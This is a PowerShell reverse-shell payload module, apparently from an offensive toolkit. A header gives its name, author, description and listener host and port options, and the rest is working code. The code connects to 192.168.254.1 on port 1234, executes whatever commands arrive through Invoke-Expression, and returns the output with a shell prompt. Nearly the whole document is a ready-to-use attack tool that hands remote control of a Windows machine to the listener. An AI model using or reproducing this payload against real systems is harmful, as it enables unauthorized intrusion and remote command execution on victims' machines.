##########
Name: Reverse-shell
Author: @nikhil_mitt http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
Description: Spawn Reverse shell
Options:
    lhost: "0.0.0.0"
    lport: 1234
##########

$client = New-Object System.Net.Sockets.TCPClient("192.168.254.1",1234);
$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();
};
$client.Close();